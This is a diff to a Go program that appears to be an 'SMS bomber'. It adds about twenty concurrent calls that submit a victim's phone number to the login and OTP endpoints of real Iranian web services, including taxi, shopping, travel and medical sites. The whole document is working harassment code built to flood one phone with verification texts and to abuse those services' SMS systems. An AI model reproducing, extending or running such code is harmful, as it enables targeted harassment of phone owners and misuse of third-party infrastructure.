@@ -212,28 +212,74 @@ func main() {
 
 		go sms("https://nobat.ir/api/public/patient/login/phone", map[string]interface{}{
 			"------WebKitFormBoundary5wscOwxMqnICoiZY\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n": phone,
-		}, ch)
+		}, ch)   // add site
 		go sms("https://www.digistyle.com/users/login-register/", map[string]interface{}{
 			"loginRegister%5Bemail_phone%5D=": phone,
-		}, ch)
+		}, ch)   // add site
 		go sms("https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&clientVersion=52f02dbc&optionalVersion=5.6.6&UDID=fb000c1a-41a6-4059-8e22-7fb820e6942b", map[string]interface{}{
 			"cellphone=": phone,
-		}, ch)
+		}, ch)   // add site
 		go sms("https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/", map[string]interface{}{
 			"phoneNumber": phone,
-		}, ch)
+		}, ch)   // add site
 		go sms("https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
 			"phone": phone,
-		}, ch)
+		}, ch)   // add site
 		go sms("https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone=", map[string]interface{}{
 			"cellphone": phone,
-		}, ch)
+		}, ch)   // add site
 		go sms("https://api.ostadkr.com/login", map[string]interface{}{
 			"mobile": phone,
-		}, ch)
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch)
+		}, ch)   // add site
+		go sms("https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{
+			"phone_number": phone,
+		}, ch)   // add site
+		go sms("https://drdr.ir/api/v3/auth/login/mobile/init", map[string]interface{}{
+			"mobile": phone,
+		}, ch) 
+		go sms("https://gw.taaghche.com/v4/site/auth/login", map[string]interface{}{
+			"contact": phone,
+		}, ch) 
+		go sms("https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{
+			"contact": phone,
+		}, ch) 
+		go sms("https://api.komodaa.com/api/v2.6/loginRC/request", map[string]interface{}{
+			"phone_number": phone,
+		}, ch) 
+		go sms("https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", map[string]interface{}{
+			"MobileNumber": phone,
+		}, ch) 
+		go sms("https://uiapi2.saapa.ir/api/otp/sendCode", map[string]interface{}{
+			"mobile": phone,
+		}, ch) 
+		go sms("https://api.vandar.io/account/v1/check/mobile", map[string]interface{}{
+			"mobile": phone,
+		}, ch) 
+		go sms("https://api.mobit.ir/api/web/v8/register/register", map[string]interface{}{
+			"number": phone,
+		}, ch) 
+		go sms("https://taraazws.jabama.com/api/v4/account/send-code", map[string]interface{}{
+			"mobile": phone,
+		}, ch) 
+		go sms("https://api.pinorest.com/frontend/auth/login/mobile", map[string]interface{}{
+			"mobile": phone,
+		}, ch) 
+		go sms("https://service.tetherland.com/api/v5/login-register", map[string]interface{}{
+			"mobile": phone,
+		}, ch) 
+		go sms("https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
+			"phoneNumber": phone,
+		}, ch) 
+		go sms("https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
+			"mobile": phone,
+		}, ch) 
+		go sms("https://student.classino.com/otp/v1/api/login", map[string]interface{}{
+			"mobile": phone,
+		}, ch) 
+		go sms("https://takshopaccessorise.ir/api/v1/sessions/login_request", map[string]interface{}{
+			"mobile_phone": phone,
+		}, ch) 
+
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
